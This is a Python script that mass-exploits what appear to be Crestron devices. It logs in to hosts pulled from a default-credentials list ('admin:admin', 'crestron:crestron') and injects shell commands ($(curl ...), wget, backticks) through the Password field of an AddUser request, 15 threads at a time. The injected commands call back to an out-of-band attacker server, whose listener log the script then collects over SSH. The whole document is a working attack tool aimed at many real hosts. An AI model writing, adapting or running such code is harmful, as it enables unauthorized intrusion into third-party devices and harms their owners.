#!/usr/bin/env python3
"""[REDACTED-ID]_006 OOB Injection Blast — Threaded, robust logging"""
import requests, urllib3, base64, time, hashlib, sys, json
from concurrent.futures import ThreadPoolExecutor, as_completed
urllib3.disable_warnings()

OOB = "[REDACTED-IP]"
TIMEOUT = 40
WORKERS = 15
LOG = "/tmp/cf4_006_injection_results.log"

def log(msg):
    line = f"[{time.strftime('%H:%M:%S')}] {msg}"
    sys.stdout.write(line + "\n")
    sys.stdout.flush()
    with open(LOG, "a") as f:
        f.write(line + "\n")
        f.flush()

def get_hosts():
    hosts = []
    with open("/home/[REDACTED]/Desktop/[REDACTED-PATH]/[REDACTED-PROJECT]/[REDACTED-ID]_Crestron_FW3x/scripts/DefaultCredsAll.txt") as f:
        for line in f:
            if "admin:admin" in line and "DOCTYPE" not in line and "<html" not in line and "recaptcha" not in line:
                hosts.append(line.split("|")[0].strip())
    return hosts

def inject(host):
    tag = hashlib.md5(host.encode()).hexdigest()[:8]
    payloads = [
        ("curl", f"test'$(curl http://{OOB}/cf4/{tag}/{host})'"),
        ("wget", f"test'$(wget -qO- http://{OOB}/cf4w/{tag}/{host})'"),
        ("btck", f"test'`curl http://{OOB}/cf4b/{tag}/{host}`'"),
    ]
    for pname, pw in payloads:
        url = f"https://{host}/Device"
        body = {"Device":{"Authentication":{"AddUser":{"UserName":f"t{tag[:5]}","Password":pw}}}}
        hdr = {"Content-Type":"application/json","Authorization":"Basic "+base64.b64encode(b"admin:admin").decode()}
        try:
            t0 = time.time()
            r = requests.post(url, json=body, headers=hdr, verify=False, timeout=TIMEOUT)
            dt = time.time() - t0
            if dt > 25:
                log(f"{host} [{pname}] HTTP {r.status_code} {dt:.1f}s CTP_DISPATCHED")
            else:
                log(f"{host} [{pname}] HTTP {r.status_code} {dt:.1f}s quick")
        except requests.exceptions.Timeout:
            dt = time.time() - t0
            log(f"{host} [{pname}] TIMEOUT {dt:.1f}s CTP_DISPATCHED")
        except requests.exceptions.ConnectionError:
            log(f"{host} [{pname}] CONN_ERR")
            break  # skip remaining payloads for unreachable host
        except Exception as e:
            log(f"{host} [{pname}] ERR: {e}")
        time.sleep(0.2)
    return host

# Also try crestron:crestron host
def inject_crestron(host):
    tag = hashlib.md5(host.encode()).hexdigest()[:8]
    pw = f"test'$(curl http://{OOB}/cf4c/{tag}/{host})'"
    url = f"https://{host}/Device"
    body = {"Device":{"Authentication":{"AddUser":{"UserName":f"t{tag[:5]}","Password":pw}}}}
    hdr = {"Content-Type":"application/json","Authorization":"Basic "+base64.b64encode(b"crestron:crestron").decode()}
    try:
        t0 = time.time()
        r = requests.post(url, json=body, headers=hdr, verify=False, timeout=TIMEOUT)
        dt = time.time() - t0
        log(f"{host} [crestron] HTTP {r.status_code} {dt:.1f}s {'CTP_DISPATCHED' if dt>25 else 'quick'}")
    except requests.exceptions.Timeout:
        log(f"{host} [crestron] TIMEOUT {time.time()-t0:.1f}s CTP_DISPATCHED")
    except Exception as e:
        log(f"{host} [crestron] ERR: {e}")

if __name__ == "__main__":
    with open(LOG, "w") as f:
        f.write("")

    hosts = get_hosts()
    log(f"[REDACTED-ID]_006 BLAST: {len(hosts)} hosts, {WORKERS} threads, OOB={OOB}")
    log(f"Monitor: tail -f {LOG}")
    log(f"OOB log: ssh [REDACTED-SSH] 'tail -f /tmp/oob_listener.log'")
    log("=" * 70)

    t_start = time.time()
    dispatched = 0

    with ThreadPoolExecutor(max_workers=WORKERS) as pool:
        futures = {pool.submit(inject, h): h for h in hosts}
        # Also add crestron:crestron host
        futures[pool.submit(inject_crestron, "[REDACTED-IP]")] = "[REDACTED-IP]-crestron"

        for f in as_completed(futures):
            try:
                f.result()
            except Exception as e:
                log(f"THREAD_ERR: {futures[f]}: {e}")

    elapsed = time.time() - t_start
    log("=" * 70)
    log(f"DONE in {elapsed:.0f}s. Check OOB: ssh [REDACTED-SSH] 'cat /tmp/oob_listener.log'")

    # Wait 30s for delayed callbacks
    log("Waiting 30s for delayed OOB callbacks...")
    time.sleep(30)

    # Final OOB check
    import subprocess
    try:
        r = subprocess.run(["ssh","-o","StrictHostKeyChecking=no","-o","ConnectTimeout=10",
            "-i","/home/[REDACTED]/Desktop/[REDACTED-PATH]/[REDACTED-KEY]","ubuntu@[REDACTED-IP]",
            "cat /tmp/oob_listener.log"], capture_output=True, text=True, timeout=15)
        log("=== FINAL OOB LOG ===")
        for line in r.stdout.strip().split("\n"):
            log(f"  {line}")
    except:
        log("Could not fetch final OOB log")
